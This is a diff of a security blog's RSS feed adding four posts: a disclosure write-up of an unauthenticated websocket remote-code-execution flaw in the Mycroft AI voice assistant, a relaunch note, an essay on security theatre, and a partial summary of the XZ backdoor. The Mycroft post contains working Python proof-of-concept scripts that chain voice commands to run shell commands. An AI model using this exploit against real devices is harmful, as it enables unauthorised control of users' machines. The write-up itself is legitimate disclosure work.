@@ -1,1 +1,386 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>All Posts - appsec &amp; stuff</title><link>https://appsec.space/posts/</link><description>All Posts | appsec &amp; stuff</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 13 Feb 2023 20:20:00 +0100</lastBuildDate><atom:link href="https://appsec.space/posts/" rel="self" type="application/rss+xml"/></channel></rss>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>All Posts - appsec &amp; stuff</title><link>https://appsec.space/posts/</link><description>All Posts | appsec &amp; stuff</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 30 Mar 2024 19:49:24 +0100</lastBuildDate><atom:link href="https://appsec.space/posts/" rel="self" type="application/rss+xml"/><item><title>Getting "Zero Click" Remote Code Execution in Mycroft AI vocal assistant</title><link>https://appsec.space/posts/mycroft-ai-rce/</link><pubDate>Sun, 10 Jun 2018 20:59:09 +0200</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/mycroft-ai-rce/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/posts/mycroft-ai-rce/mycroft.png" referrerpolicy="no-referrer">
+            </div><h2 id="introduction" class="headerLink">
+    <a href="#introduction" class="header-mark"></a>1 Introduction</h2><p>During my journey contributing to open source I was working with my friend <a href="https://github.com/portaloffreedom" target="_blank" rel="noopener noreferrer">Matteo De Carlo</a> on an <a href="https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD" target="_blank" rel="noopener noreferrer">AUR Package</a> of a really interesting project called <a href="https://mycroft.ai" target="_blank" rel="noopener noreferrer">Mycroft AI</a>. It&rsquo;s an AI-powered vocal assistant started with a <a href="https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for" target="_blank" rel="noopener noreferrer">crowdfunding campaign</a> in 2015 and a <a href="https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/" target="_blank" rel="noopener noreferrer">more recent one</a> that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on <a href="https://www.youtube.com/watch?v=6GHmzbXp_jY" target="_blank" rel="noopener noreferrer">Jaguar F-Type</a> and <a href="https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/" target="_blank" rel="noopener noreferrer">Land Rover</a></p>
+<h2 id="digging-in-the-source-code" class="headerLink">
+    <a href="#digging-in-the-source-code" class="header-mark"></a>2 Digging in the source code</h2><p>While looking at the <a href="https://github.com/MycroftAI/mycroft-core" target="_blank" rel="noopener noreferrer">source code</a> I found an interesting point: <a href="https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57" target="_blank" rel="noopener noreferrer">here</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;port&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;route&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">validate_param</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="s2">&#34;websocket.host&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">validate_param</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="s2">&#34;websocket.port&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">validate_param</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="s2">&#34;websocket.route&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">routes</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">WebsocketEventHandler</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">application</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span> <span class="o">**</span><span class="n">settings</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">application</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ioloop</span><span class="o">.</span><span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>it defines a websocket server that uses to get instructions from the remote clients (like the <a href="https://github.com/MycroftAI/Mycroft-Android" target="_blank" rel="noopener noreferrer">Android one</a>). The settings for the websocket server are defined in <a href="https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117" target="_blank" rel="noopener noreferrer">mycroft.conf</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// The mycroft-core messagebus&#39; websocket
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="s2">&#34;websocket&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;host&#34;</span><span class="p">:</span> <span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="mi">8181</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;route&#34;</span><span class="p">:</span> <span class="s2">&#34;/core&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ssl&#34;</span><span class="p">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">,</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So there is a websocket server that doesn&rsquo;t require authentication that by default is exposed on <code>0.0.0.0:8181/core</code>. Let&rsquo;s test it 😉</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">websockets</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;ws://myserver:8181/core&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;say pwned&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">sendPayload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">data</span><span class="se">\&#34;</span><span class="s2">: {</span><span class="se">\&#34;</span><span class="s2">utterances</span><span class="se">\&#34;</span><span class="s2">: [</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">command</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">]}, </span><span class="se">\&#34;</span><span class="s2">type</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">recognizer_loop:utterance</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">context</span><span class="se">\&#34;</span><span class="s2">: null}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And magically we have an answer from the vocal assistant saying <code>pwned</code>!</p>
+<p>Well, now we can have Mycroft pronounce stuff remotely, but this is not a really big finding unless you want to scare your friends, right?</p>
+<figure><img src="https://media1.tenor.com/images/8a4a99d3bd67ba8d9a025c36edf4a624/tenor.gif"><figcaption>
+      <h4>WRONG</h4>
+    </figcaption>
+</figure>
+
+<h2 id="the-skills-system" class="headerLink">
+    <a href="#the-skills-system" class="header-mark"></a>3 The skills system</h2><p>Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)</p>
+<p>How is a skill composed? From what we can see from the documentation a default skill is composed by:</p>
+<ul>
+<li><code>dialog/en-us/command.dialog</code> contains the vocal command that will trigger the skill</li>
+<li><code>vocab/en-us/answer.voc</code> contains the answer that Mycroft will pronounce</li>
+<li><code>requirements.txt</code> contains the requirements for the skill that will be installed with <code>pip</code></li>
+<li><code>__int__.py</code> contains the main function of the skill and will be loaded when the skill is triggered</li>
+</ul>
+<h2 id="what-can-i-do-now" class="headerLink">
+    <a href="#what-can-i-do-now" class="header-mark"></a>4 What can I do now?</h2><p>I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.</p>
+<h3 id="so-im-done" class="headerLink">
+    <a href="#so-im-done" class="header-mark"></a>4.1 So I&rsquo;m done?</h3><p>Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better&hellip;</p>
+<h2 id="getting-a-remote-shell-using-default-skills" class="headerLink">
+    <a href="#getting-a-remote-shell-using-default-skills" class="header-mark"></a>5 Getting a remote shell using default skills</h2><p>We know that Mycroft has some <a href="https://github.com/MycroftAI/mycroft-skills" target="_blank" rel="noopener noreferrer">default skills</a> like <code>open</code> that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called <code>skill-autogui</code>, whose description says <code>Manipulate your mouse and keyboard with Mycroft</code>. <strong>We got it!</strong></p>
+<p>Let&rsquo;s try to combine everything we found so far into a PoC:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">websockets</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cmds</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;mute audio&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;ws://myserver:8181/core&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">sendPayload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">data</span><span class="se">\&#34;</span><span class="s2">: {</span><span class="se">\&#34;</span><span class="s2">utterances</span><span class="se">\&#34;</span><span class="s2">: [</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">]}, </span><span class="se">\&#34;</span><span class="s2">type</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">recognizer_loop:utterance</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">context</span><span class="se">\&#34;</span><span class="s2">: null}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running the exploit with <code>python pwn.py &quot;install autogui&quot; &quot;open xterm&quot; &quot;type echo pwned&quot; &quot;press enter&quot;</code>  allowed me to finally get a command execution on a Linux machine.</p>
+<figure><img src="https://raw.githubusercontent.com/Nhoya/MycroftAI-RCE/master/PoC.gif"><figcaption>
+      <h4>PoC</h4>
+    </figcaption>
+</figure>
+
+<h2 id="_notes_" class="headerLink">
+    <a href="#_notes_" class="header-mark"></a>6 <em>Notes</em></h2><ul>
+<li><code>open xterm</code> was needed because my test Linux environment had a DE installed, on a remote server the commands will be executed directly on TTY so this step is not nesessary.</li>
+<li>The skill branching had a <a href="https://mycroft.ai/blog/skill-branching-18-02/" target="_blank" rel="noopener noreferrer">big change</a> and now some skills are not (yet) available (autogui is one of them) but this is not the real point. Mycroft has skills to interact with domotic houses and other services that can still be manipulated (the lack of imagination is the limit here). The vulnerability lies in the lack of authentication for the ws.</li>
+</ul>
+<h2 id="affected-devices" class="headerLink">
+    <a href="#affected-devices" class="header-mark"></a>7 Affected devices</h2><pre><code>All the devices running Mycroft &lt;= ? with the websocket server exposed (Mark-I has the websocket behind a firewall by default)
+</code></pre>
+<h2 id="timeline" class="headerLink">
+    <a href="#timeline" class="header-mark"></a>8 Timeline</h2><ul>
+<li>08/03/2018 Vulnerability found</li>
+<li>09/03/2018 Vulnerability reported</li>
+<li>13/03/2018 The CTO answered that they are aware of this problem and are currently working on a patch</li>
+<li>06/06/2018 The CTO said that they have no problem with the release of the vulnerability and will add a warning to remember the user to use a firewall <code>¯\_(ツ)_/¯</code></li>
+<li>09/06/2018 Public disclosure</li>
+</ul>
+]]></description></item><item><title>Long Time No See</title><link>https://appsec.space/posts/long-time-no-see/</link><pubDate>Mon, 06 Feb 2023 00:01:18 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/long-time-no-see/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/posts/long-time-no-see/header.jpg" referrerpolicy="no-referrer">
+            </div><p>Long time no see, uh? Lot of stuff happen since the last post in 2018 on <a href="https://bsod.dev" target="_blank" rel="noopener noreferrer">the old blog</a>.</p>
+<p>Unfortunately I wasn&rsquo;t able to write much, both for the lack of time and the impossibility to share what I learned.
+This post contains an introduction to this new website and how it will work from now on.</p>
+<p>First of all, I&rsquo;m still in Security but moved to Product Security (more on this on a later post but TL;DR: boredom, careeer and growth opportunities, frustration and fear of burnout).
+Fortunately I still have time and resources on my job to conduct vulnerability research so occasionally I will post about interesting vulnerabilities I found.
+I would also like to talk about security aspects more related to SDLC, so let&rsquo;s see how it&rsquo;ll go.</p>
+<h2 id="how-this-blog-works" class="headerLink">
+    <a href="#how-this-blog-works" class="header-mark"></a>1 How this blog works</h2><p>The setup is pretty simple, I&rsquo;m using <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">hugo</a> to build static pages and publish them on GitHub pages. There is a <a href="https://github.com/peaceiris/actions-hugo" target="_blank" rel="noopener noreferrer">Github Action</a> running that builds and deploy the pages every time a PR is approved on the <code>main</code> branch.
+<figure><a class="lightgallery" href="/posts/long-time-no-see/blog_CI_CD.png" title="/posts/long-time-no-see/blog_CI_CD.png" data-thumbnail="/posts/long-time-no-see/blog_CI_CD.png" data-sub-html="<h2>A graph represeting the logic flow behind the blog deployment system</h2>">
+        <img
+            
+            loading="lazy"
+            src="/posts/long-time-no-see/blog_CI_CD.png"
+            srcset="/posts/long-time-no-see/blog_CI_CD.png, /posts/long-time-no-see/blog_CI_CD.png 1.5x, /posts/long-time-no-see/blog_CI_CD.png 2x"
+            sizes="auto"
+            alt="/posts/long-time-no-see/blog_CI_CD.png">
+    </a><figcaption class="image-caption">A graph represeting the logic flow behind the blog deployment system</figcaption>
+    </figure></p>
+<p>The theme used is <a href="https://hugoloveit.com/" target="_blank" rel="noopener noreferrer">LoveIt</a>, it&rsquo;s pretty cool and rich of features but has few bugs that need to be fixed; for example, if you are using the blog in Italian you can see that the localization is pretty much fucked up.
+The theme localization it&rsquo;s a pretty cool feature but having to rewrite the same post for each language is painful, so I&rsquo;m thinking about adding the support to DeepL.</p>
+<p>Last but not least, the blog got a new logo:
+<figure><a class="lightgallery" href="/images/logo.png" title="/images/logo.png" data-thumbnail="/images/logo.png" data-sub-html="<h2>appsec.space logo</h2>">
+        <img
+            
+            loading="lazy"
+            src="/images/logo.png"
+            srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+            sizes="auto"
+            alt="/images/logo.png">
+    </a><figcaption class="image-caption">appsec.space logo</figcaption>
+    </figure></p>
+<p>it was generated by <a href="https://midjourney.com" target="_blank" rel="noopener noreferrer">Midjourney</a> and means absolutely nothing!</p>
+<h2 id="the-future" class="headerLink">
+    <a href="#the-future" class="header-mark"></a>2 The future</h2><p>What&rsquo;s next, you ask? Well.. a lot of stuff actually. First of all I need to migrate all the posts from the old blog because I would like to retain an archive. Next I can start writing new posts.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">If you get a redirect from the old blog to the new one the process has been completed.</div>
+        </div>
+    </div>
+<p>Despite being called <code>appsec.space</code> I would like to talk about different topics, spacing from Application Security to Malware Developmemnt (for learning purposes <a href="https://www.youtube.com/watch?v=HmZm8vNHBSU" target="_blank" rel="noopener noreferrer">of course</a>), to productivity setup and generic rants, basically turning this blog into my stream of counciousness.</p>
+<p>The next post will probably talk about the <a href="https://en.wikipedia.org/wiki/Security_theater" target="_blank" rel="noopener noreferrer">Security Theater</a>.</p>
+<p>See you then!</p>]]></description></item><item><title>Security Theatre? More like Security Circus</title><link>https://appsec.space/posts/security-theatre/</link><pubDate>Mon, 13 Feb 2023 20:20:00 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/security-theatre/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/posts/security-theatre/cargocult.jpg" referrerpolicy="no-referrer">
+            </div><p>I have seen many companies invest significant time and resources into security measures that have little to no actual effect on security. This is commonly referred to as &ldquo;security theater&rdquo;.</p>
+<h2 id="what-is-the-security-theatre" class="headerLink">
+    <a href="#what-is-the-security-theatre" class="header-mark"></a>1 What is the Security Theatre</h2><p>Security theater refers to the practice of implementing security measures for the sake of appearances, without any significant impact on actual security. These measures may give the illusion of protection, but in reality, they provide little to no real security benefits.</p>
+<p>Organizations often fall into the trap of focusing solely on compliance requirements without considering their actual security needs. Compliance-driven security measures may give the illusion of being protected, but they often fail to address the specific security risks faced by an organization.</p>
+<p>Useless compliance can also result in organizations wasting valuable resources on implementing measures that do not have a significant impact on their security posture. This can lead to a situation where an organization is in compliance with regulations, but the security budget is depleted, while their assets are still vulnerable to attacks.</p>
+<p><a href="https://www.youtube.com/watch?v=vRp7tYWnJJs" target="_blank" rel="noopener noreferrer">Oh, how I love the smell of compliance in the morning</a>.</p>
+<p>An example of Security Theatre is the use of complex passwords that are changed regularly. Although it may seem like a good idea, it can lead to password fatigue and employees using easier-to-remember passwords, which actually undermines security. This is among the reasons why companies like <a href="https://techcommunity.microsoft.com/t5/microsoft-entra-azure-ad-blog/expansion-of-fido-standard-and-new-updates-for-microsoft/ba-p/3290633" target="_blank" rel="noopener noreferrer">Microsoft</a>, <a href="https://www.apple.com/newsroom/2022/05/apple-google-and-microsoft-commit-to-expanded-support-for-fido-standard/" target="_blank" rel="noopener noreferrer">Apple</a>, and <a href="https://blog.google/technology/safety-security/one-step-closer-to-a-passwordless-future/" target="_blank" rel="noopener noreferrer">Google</a> are moving away from passwords.</p>
+<figure><img src="https://imgs.xkcd.com/comics/password_strength.png"><figcaption>
+      <h4>fix your password policy</h4>
+    </figcaption>
+</figure>
+
+<p>Another example of security theatre is implementing security controls that are not properly configured or maintained. For instance, firewalls, IDS and IPS are a common security measure that are often poorly configured or not kept up-to-date with the latest security patches</p>
+<h2 id="root-cause" class="headerLink">
+    <a href="#root-cause" class="header-mark"></a>2 Root cause</h2><p>Cybersecurity has become the new gold rush, with numerous individuals and organizations seeking to take advantage of the potential financial gains. However, finding skilled personnel to address these security concerns can be challenging, and relying on consultants can lead to a situation where the organization becomes overly dependent on their expertise.</p>
+<h2 id="wrapping-up" class="headerLink">
+    <a href="#wrapping-up" class="header-mark"></a>3 Wrapping up</h2><p>Organizations can protect themselves from the constant security threats by taking a proactive approach. The first step is to gain a thorough understanding of the specific risks they are facing and then implement the necessary measures to mitigate these risks. This includes educating their employees to be aware of potential attacks and how to respond in such situations.</p>
+<p>In conclusion, to avoid being caught in the trap of &ldquo;security theater&rdquo;, organizations must concentrate on establishing practical security measures and regularly evaluate their effectiveness. Having a well-thought-out response plan in place is also critical in ensuring the protection of the organization&rsquo;s assets.</p>
+<p>Additionally, organizations should cease creating redundant policies that serve no purpose in enhancing the organization&rsquo;s overall security posture.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><a href="https://www.philvenables.com/post/ceremonial-security-and-cargo-cults" target="_blank" rel="noopener noreferrer">Here</a> you can find an interesting article from Phil Venables, Google CISO, about Cerimonial Security and Cargo Cults</div>
+        </div>
+    </div>]]></description></item><item><title>The XZ backdoor from a Security Engineer persepective</title><link>https://appsec.space/posts/xz-backdoor/index.en.md/</link><pubDate>Sat, 30 Mar 2024 19:49:24 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/xz-backdoor/index.en.md/</guid><description><![CDATA[<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The situation is still ongoing, more details will emerge in the near future and I will upgrade this post accordingly.</div>
+        </div>
+    </div>
+<p>As you probably already heard, the <code>xz</code> package got compromised. The package was used as entrypoint to inject malicious code in sshd, altering the authentication flow. This forged vulnerability is now known as CVE-2024-3094.</p>
+<p>This is probably a full fledge operation due to it&rsquo;s methodology and duration but I&rsquo;m not the right guy to talk about OpSec and Threat Actors attributions.
+As soon as I will find a complete analysis on that matter I will link it.</p>
+<p>The situation doesn&rsquo;t look too good so I&rsquo;m trying to write this blogpost as a summary. I don&rsquo;t want to address the technical aspect of the compromission but I want to look at the issue from the perspective of a Security Engineer, summarizing what went wrong and trying to find a remediation.</p>
+<h2 id="timeline" class="headerLink">
+    <a href="#timeline" class="header-mark"></a>1 Timeline</h2><ul>
+<li><strong>23 Mar 2024</strong>:
+<ul>
+<li>One of the two maintainers of the <code>xz</code> package publishes a malicious commit to upstream.</li>
+</ul>
+</li>
+<li><strong>29 Mar 2024</strong>:
+<ul>
+<li>
+<p>Andres Freund sent an email to the oss-security security regarding a backdoor in <code>xz/liblzma</code>.
+He was optimizing his infrastructure and found that ssh was  suspiciously slow. Some debug later he found the issue was likely caused by the backdoor</p>
+</li>
+<li>
+<p>The post was sent to the oss-security mailing list</p>
+</li>
+<li>
+<p>Impacted distros are starting to ship patches to downgrade the xz version (more on that later)</p>
+</li>
+</ul>
+</li>
+<li><strong>30 Mar 2024</strong>:
+<ul>
+<li>GitHub blocked access to the repostiory and blocked the account of both the xz maintainers</li>
+</ul>
+</li>
+</ul>
+<h2 id="impacted-components" class="headerLink">
+    <a href="#impacted-components" class="header-mark"></a>2 Impacted components</h2><p>The extent of this breach is still unkown, but here is a (partial) list of components shipping the known malicious version of <code>xz</code>:</p>
+<p>Distributions:</p>
+<ul>
+<li>Arch</li>
+<li>Gentoo</li>
+<li>Manjaro Testing</li>
+<li>Parabola</li>
+<li>NixOS Unstable</li>
+<li>Slackware</li>
+<li>SUSE Thumbleweed</li>
+<li>Kali Linux</li>
+</ul>
+<p>The backdoored package is also contained in the following package managers:</p>
+<ul>
+<li>Homebrew</li>
+<li>MacPorts</li>
+<li>pkgsrc</li>
+</ul>
+<h2 id="considerations" class="headerLink">
+    <a href="#considerations" class="header-mark"></a>3 Considerations</h2><h3 id="the-github-behavior" class="headerLink">
+    <a href="#the-github-behavior" class="header-mark"></a>3.1 The GitHub Behavior</h3><p>The reasons behind the <code>xz</code> repositories are still a mistery to me, especially knowing that with the source code available additional anaysis on the backdoor could be performed.</p>
+<p>Blocking access to the source code is something that will delay further results, that is honestly really bad for time-critical situation like this one.</p>
+<h3 id="the-downgrades" class="headerLink">
+    <a href="#the-downgrades" class="header-mark"></a>3.2 The downgrades</h3><p>The patch strategy for basically everyone was to force a downgrade from the <code>5.6.0</code>-<code>5.6.1</code> to another version.<br>
+Some (homebrew, for exaple), forced the downgrade to 5.4.6.</p>
+<p>This looks interesting because for sure we know there is a backdoor on that (<code>5.6.0</code>-<code>5.6.1</code>) versions, but we also know that the attacker has been working on the repository for over two years.</p>
+<p>The <code>5.4.6</code> version is also builded by the attacker and honestly wouldn&rsquo;t trust it much.
+Again, thanks GitHub for locking the access to the source code.</p>
+<h2 id="how-to-prevent-this-issue" class="headerLink">
+    <a href="#how-to-prevent-this-issue" class="header-mark"></a>4 How to prevent this issue?</h2><p>As I said at the beginning of the post, I don&rsquo;t want to go too deep into the technical analysis of the backdoor, for two main reasons: with the sourcecode locked and only an archive available the informations are incomplete and I really don&rsquo;t want to reverse the <code>xz</code> binary.
